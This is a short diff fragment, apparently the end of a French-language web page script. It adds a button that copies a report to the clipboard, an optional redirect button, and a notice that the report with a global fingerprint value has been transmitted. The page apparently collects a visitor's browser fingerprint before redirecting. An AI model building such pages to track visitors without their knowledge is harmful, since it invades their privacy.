+  tools.innerHTML = `
+    <button class="btn alt" id="copy">Copier le rapport</button>
+    ${REDIRECT ? '<button class="btn" id="next">Continuer</button>' : ""}
+  `;
+  $("copy").onclick = async () => {
+    const txt = [...document.querySelectorAll(".row")].map(r =>
+      r.querySelector(".k").textContent + " : " + r.querySelector(".v").textContent).join("\n");
+    try{ await navigator.clipboard.writeText(txt); $("copy").textContent = "Copié"; }
+    catch(e){ $("copy").textContent = "Échec"; }
+  };
+  if(REDIRECT) $("next").onclick = () => location.href = REDIRECT;
+
+  const s = document.createElement("p");
+  s.className = "small";
+  s.textContent = "Rapport transmis · empreinte " + D.fpGlobal;
+  tools.after(s);
+}
+
+$("go").addEventListener("click", enter);
+$("later").addEventListener("click", enter);
 </script>
 </body>
 </html>
